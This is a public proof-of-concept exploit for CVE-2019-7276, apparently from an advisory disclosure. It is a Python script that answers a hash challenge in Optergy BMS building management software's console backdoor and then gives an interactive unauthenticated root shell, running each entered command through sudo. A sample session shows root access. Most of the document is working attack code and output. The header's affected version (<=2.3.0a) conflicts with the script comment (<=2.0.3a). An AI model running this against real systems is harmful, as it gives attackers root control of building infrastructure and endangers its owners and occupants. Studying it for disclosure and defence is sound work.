# Author: LiquidWorm
# Vendor: https://optergy.com/
# Product web page: https://optergy.com/products/
# Affected version: <=2.3.0a
# Advisory: https://applied-risk.com/resources/ar-2019-008
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# CVE: CVE-2019-7276

# PoC:

#!/usr/bin/env python
#
# Unauthenticated Remote Root Exploit in Optergy BMS (Console Backdoor)
#
# Affected version <=2.0.3a (Proton and Enterprise)
#
##############################################################################
#
# lqwrm@metalgear:~/stuff/optergy$ python getroot.py 192.168.232.19
# Challenge received: 1547540929287
# SHA1: 56a6e5bf103591ed45faa2159cae234d04f06d93
# MD5 from SHA1: 873efc9ca9171d575623a99aeda44e31
# Answer: 56a6e5bf103591ed45faa2159cae234d04f06d93873efc9ca9171d575623a99aeda44e31
# # id
# uid=0(root) gid=0(root) groups=0(root)
#
##############################################################################
#
#

import os#######
import sys######
import json#####
import hashlib##
import requests#

piton = os.path.basename(sys.argv[0])

if len(sys.argv) < 2:
    print &#039;\n\x20\x20[*] Usage: &#039;+piton+&#039; <ip:port>\n&#039;
    sys.exit()

while True:

    challenge_url = &#039;http://&#039;+sys.argv[1]+&#039;/tools/ajax/ConsoleResult.html?get&#039;

    try:
        req1 = requests.get(challenge_url)
        get_challenge = json.loads(req1.text)
        challenge = get_challenge[&#039;response&#039;][&#039;message&#039;]
        print &#039;Challenge received: &#039; + challenge

        hash_object = hashlib.sha1(challenge.encode())
        print &#039;SHA1: &#039;+(hash_object.hexdigest())
        h1 = (hash_object.hexdigest())
        hash_object = hashlib.md5(h1.encode())
        print &#039;MD5 from SHA1: &#039;+(hash_object.hexdigest())
        h2 = (hash_object.hexdigest())
        print &#039;Answer: &#039;+h1+h2
        
        zeTargets = &#039;http://&#039;+sys.argv[1]+&#039;/tools/ajax/ConsoleResult.html&#039;
        zeCommand = raw_input(&#039;# &#039;)
        if zeCommand.strip() == &#039;exit&#039;:
            sys.exit()
        zeHeaders = {&#039;User-Agent&#039;      : &#039;BB/BMS-251.4ev4h&#039;,
                     &#039;Accept&#039;          : &#039;*/*&#039;,
                     &#039;Accept-Encoding&#039; : &#039;gzip, deflate&#039;,
                     &#039;Accept-Language&#039; : &#039;mk-MK,mk;q=1.7&#039;,
                     &#039;Connection&#039;      : &#039;keep-alive&#039;,
                     &#039;Connection-Type&#039; : &#039;application/x-www-form-urlencoded&#039;}
        zePardata = {&#039;command&#039;         : &#039;sudo &#039;+zeCommand,
                     &#039;challenge&#039;       : challenge,
                     &#039;answer&#039;          : h1+h2}

        zeRequest = requests.post(zeTargets, headers=zeHeaders, data=zePardata)
        get_resp = json.loads(zeRequest.text)
        get_answ = get_resp[&#039;response&#039;][&#039;message&#039;]
        print get_answ
    except Exception:
        print &#039;[*] Error!&#039;
        break

